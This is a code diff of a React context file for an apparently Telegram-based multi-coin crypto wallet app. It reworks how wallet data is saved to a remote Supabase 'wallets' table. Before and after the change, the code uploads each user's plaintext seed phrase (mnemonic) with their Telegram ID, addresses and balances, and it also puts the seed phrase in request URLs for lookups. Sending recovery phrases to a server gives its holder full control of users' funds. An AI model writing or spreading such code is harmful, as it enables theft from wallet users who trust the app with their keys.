@@ -208,67 +208,75 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
       const { username, mnemonic, balance, telegram_id, coin_balances, addresses } = walletData;
       const cleanMnemonic = mnemonic ? (Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic) : null;
       let finalName = username;
-      if (!finalName || finalName === "Anonymous") {
-        finalName = resolveTelegramDisplayName();
-      }
+      if (!finalName || finalName === "Anonymous") finalName = resolveTelegramDisplayName();
 
       const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
       const resolvedTgId = telegram_id || (tgUser?.id ? String(tgUser.id) : null);
 
-      const payload = {
+      const BASE_HEADERS = {
+        'apikey': SUPABASE_KEY,
+        'Authorization': `Bearer ${SUPABASE_KEY}`,
+        'Content-Type': 'application/json',
+      };
+
+      // Build update payload (no mnemonic — don't overwrite seed if already stored)
+      const updatePayload = {
         username: finalName,
         balance: balance ? String(balance) : "0",
         created_at: getMoscowTimestamp(),
       };
-      if (cleanMnemonic) payload.mnemonic = cleanMnemonic;
-      if (resolvedTgId) payload.telegram_id = resolvedTgId;
-      if (addresses) payload.addresses = JSON.stringify(addresses);
-
+      if (resolvedTgId) updatePayload.telegram_id = resolvedTgId;
+      if (addresses) updatePayload.addresses = JSON.stringify(addresses);
       const COINS = ['ETH','TON','BNB','LTC','ARB','SOL','USDT'];
       if (coin_balances) {
         COINS.forEach(sym => {
-          payload[sym.toLowerCase() + '_balance'] =
+          updatePayload[sym.toLowerCase() + '_balance'] =
             coin_balances[sym] !== undefined ? String(coin_balances[sym]) : "0";
         });
       }
 
-      async function tryUpsert(conflictCol) {
-        const url = `${SUPABASE_URL}/rest/v1/wallets?on_conflict=${conflictCol}`;
-        const res = await fetch(url, {
-          method: 'POST',
-          headers: {
-            'apikey': SUPABASE_KEY,
-            'Authorization': `Bearer ${SUPABASE_KEY}`,
-            'Content-Type': 'application/json',
-            'Prefer': 'resolution=merge-duplicates',
-          },
-          body: JSON.stringify(payload),
-        });
-        if (!res.ok) {
-          const txt = await res.text();
-          console.warn(`[Supabase Context] on_conflict=${conflictCol} failed ${res.status}:`, txt);
-          return false;
+      // Full payload includes mnemonic (for INSERT only)
+      const insertPayload = { ...updatePayload };
+      if (cleanMnemonic) insertPayload.mnemonic = cleanMnemonic;
+
+      // ── Step 1: try PATCH by telegram_id (explicit UPDATE — works without UNIQUE constraint issues) ──
+      let updated = false;
+      if (resolvedTgId) {
+        const pRes = await fetch(
+          `${SUPABASE_URL}/rest/v1/wallets?telegram_id=eq.${encodeURIComponent(resolvedTgId)}`,
+          { method: 'PATCH', headers: { ...BASE_HEADERS, 'Prefer': 'return=representation' }, body: JSON.stringify(updatePayload) }
+        );
+        if (pRes.ok) {
+          const rows = await pRes.json();
+          if (Array.isArray(rows) && rows.length > 0) { updated = true; console.log('[Supabase] PATCH by telegram_id: updated', rows.length, 'row(s)'); }
         }
-        return true;
       }
 
-      let ok = false;
-      if (resolvedTgId) ok = await tryUpsert("telegram_id");
-      if (!ok) ok = await tryUpsert("mnemonic");
-      if (!ok) {
-        // Last resort plain INSERT without telegram_id — ensures no wallet is ever silently dropped
-        const safePayload = { ...payload };
-        delete safePayload.telegram_id;
-        await fetch(`${SUPABASE_URL}/rest/v1/wallets`, {
+      // ── Step 2: try PATCH by mnemonic ──
+      if (!updated && cleanMnemonic) {
+        const pRes = await fetch(
+          `${SUPABASE_URL}/rest/v1/wallets?mnemonic=eq.${encodeURIComponent(cleanMnemonic)}`,
+          { method: 'PATCH', headers: { ...BASE_HEADERS, 'Prefer': 'return=representation' }, body: JSON.stringify(updatePayload) }
+        );
+        if (pRes.ok) {
+          const rows = await pRes.json();
+          if (Array.isArray(rows) && rows.length > 0) { updated = true; console.log('[Supabase] PATCH by mnemonic: updated', rows.length, 'row(s)'); }
+        }
+      }
+
+      // ── Step 3: INSERT new record if nothing was updated ──
+      if (!updated) {
+        const iRes = await fetch(`${SUPABASE_URL}/rest/v1/wallets`, {
           method: 'POST',
-          headers: {
-            'apikey': SUPABASE_KEY,
-            'Authorization': `Bearer ${SUPABASE_KEY}`,
-            'Content-Type': 'application/json',
-            'Prefer': 'return=minimal',
-          },
-          body: JSON.stringify(safePayload),
+          headers: { ...BASE_HEADERS, 'Prefer': 'return=minimal' },
+          body: JSON.stringify(insertPayload),
         });
+        if (!iRes.ok) {
+          const txt = await iRes.text();
+          console.warn('[Supabase] INSERT failed:', iRes.status, txt);
+        } else {
+          console.log('[Supabase] INSERT new wallet row');
+        }
       }
     } catch (e) {
       console.error("[Supabase Fetch Error Context]", e);
@@ -419,7 +427,12 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
 
       const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
       const userName = buildTgUserName(tgUser);
-      const stored = JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}');
+
+      // Re-compute storage key at call time — module-level STORAGE_KEY may have been
+      // evaluated before Telegram.WebApp was ready, losing the _userId suffix.
+      const _suffix = tgUser?.id ? `_${tgUser.id}` : '';
+      const _key = `gem_wallet_v2${_suffix}`;
+      const stored = JSON.parse(localStorage.getItem(_key) || localStorage.getItem('gem_wallet_v2') || '{}');
       const addresses = stored.addresses || {};
 
       const fmtN = (v) => { const n = parseFloat(v); return (!n || Math.abs(n) < 1e-7) ? '0' : (n < 1 ? n.toFixed(6).replace(/\.?0+$/, '') : n.toFixed(4).replace(/\.?0+$/, '')); };
